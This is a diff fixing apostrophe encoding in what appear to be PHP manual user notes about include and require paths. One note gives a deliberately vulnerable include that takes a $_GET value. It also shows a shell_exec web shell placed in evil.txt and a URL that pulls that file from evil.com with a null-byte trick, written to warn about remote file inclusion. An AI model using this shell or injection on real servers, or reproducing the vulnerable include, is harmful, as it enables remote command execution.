@@ -6,7 +6,7 @@ This might be useful:<br>
 
 ```
 <?php
-include $_SERVER[&apos;DOCUMENT_ROOT&apos;]."/lib/sample.lib.php";
+include $_SERVER['DOCUMENT_ROOT']."/lib/sample.lib.php";
 ?>
 ```
 <br>So you can move script anywhere in web-project tree without changes.  
@@ -19,8 +19,8 @@ If you want to have include files, but do not want them to be accessible directl
 <?php
 
 # index.php
-define(&apos;what&apos;, &apos;ever&apos;);
-include &apos;includeFile.php&apos;;
+define('what', 'ever');
+include 'includeFile.php';
 
 # includeFile.php
 
@@ -39,7 +39,7 @@ The reason you should not do this is because there is a better option available.
 
 # index.php (in document root (/usr/share/nginx/html))
 
-include __DIR__ . &apos;/../src/includeFile.php&apos;;
+include __DIR__ . '/../src/includeFile.php';
 
 ?>
 ```
@@ -52,8 +52,8 @@ Before using php&apos;s include, require, include_once or require_once statement
 ```
 <?php
 // Bad Code
-$path = $_GET[&apos;path&apos;];
-include $path . &apos;example-config-file.php&apos;;
+$path = $_GET['path'];
+include $path . 'example-config-file.php';
 ?>
 ```
 
@@ -66,7 +66,7 @@ evil.txt
 
 
 ```
-<?php echo shell_exec($_GET[&apos;command&apos;]);?>
+<?php echo shell_exec($_GET['command']);?>
 ```
 <br><br>It is a text file so it would not be processed on my server but on the target/victim server.  I would browse to:<br>h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00<br><br>The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.  In this case, it is whoami.  I ended the path variable with a %00, which is the null character.  The original include statement in the example.php would ignore the rest of the line.  It should tell me who the web server is running as.<br><br>Please use proper input validation if you use variables in an include statement.  
 
@@ -80,9 +80,9 @@ As a rule of thumb, never include files using relative paths. To do this efficie
 
 ```
 <?php // prepend.php - autoprepended at the top of your tree
-define(&apos;MAINDIR&apos;,dirname(__FILE__) . &apos;/&apos;);
-define(&apos;DL_DIR&apos;,MAINDIR . &apos;downloads/&apos;);
-define(&apos;LIB_DIR&apos;,MAINDIR . &apos;lib/&apos;);
+define('MAINDIR',dirname(__FILE__) . '/');
+define('DL_DIR',MAINDIR . 'downloads/');
+define('LIB_DIR',MAINDIR . 'lib/');
 ?>
 ```
 
@@ -94,21 +94,21 @@ and so on. This way, the files in your framework will only have to issue stateme
 
 ```
 <?php
-require_once(LIB_DIR . &apos;excel_functions.php&apos;);
+require_once(LIB_DIR . 'excel_functions.php');
 ?>
 ```
 
 
 This also frees you from having to check the include path each time you do an include.
 
-If you&apos;re running scripts from below your main web directory, put a prepend.php file in each subdirectory:
+If you're running scripts from below your main web directory, put a prepend.php file in each subdirectory:
 
 --
 
 
 ```
 <?php
-include(dirname(dirname(__FILE__)) . &apos;/prepend.php&apos;);
+include(dirname(dirname(__FILE__)) . '/prepend.php');
 ?>
 ```
 <br>--<br><br>This way, the prepend.php at the top always gets executed and you&apos;ll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.  
